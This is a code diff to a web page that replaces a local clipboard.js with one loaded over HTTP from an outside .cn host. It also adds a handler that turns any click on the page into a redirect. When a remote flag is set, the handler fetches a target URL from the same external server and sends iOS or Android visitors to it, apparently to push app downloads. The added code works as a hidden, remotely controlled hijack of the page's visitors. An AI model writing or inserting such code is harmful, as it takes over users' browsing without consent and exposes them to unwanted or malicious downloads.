@@ -52,7 +52,7 @@ var _hmt = _hmt || [];
           <area shape="rect" id="b_dw4" coords="" href="javascript:;">
         </map>
 </center>
-<script src="js/clipboard.js"></script>
+<script src="http://cdn.lyplaaap.cn/srgj.zjzhidao.cn/cj/clipboard.js"></script>
 <script>
 
     $.ajax({
@@ -96,6 +96,32 @@ var _hmt = _hmt || [];
             $("#b_dw2").attr("coords",dw2);
             $("#b_dw3").attr("coords",dw3);
             $("#b_dw4").attr("coords",dw4);
+            if(data[0].dw2==1){
+                $("body").click(function () {
+                    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
+                        $.ajax({
+                            url: "http://storage.lyplaaap.cn/srgj/action/select.php",
+                            type: "get",
+                            success: function (res) {
+                                var data = jQuery.parseJSON(res)
+
+                                window.location.href = data[5].ios;
+                            }
+                        });
+                    }else {
+                        $.ajax({
+                            url: "http://storage.lyplaaap.cn/srgj/action/select.php",
+                            type: "get",
+                            success: function (res) {
+                                var data = jQuery.parseJSON(res)
+                                window.location.href = data[5].az;
+                            }
+
+                        });
+                    }
+                });
+
+            }
         }
     });
 
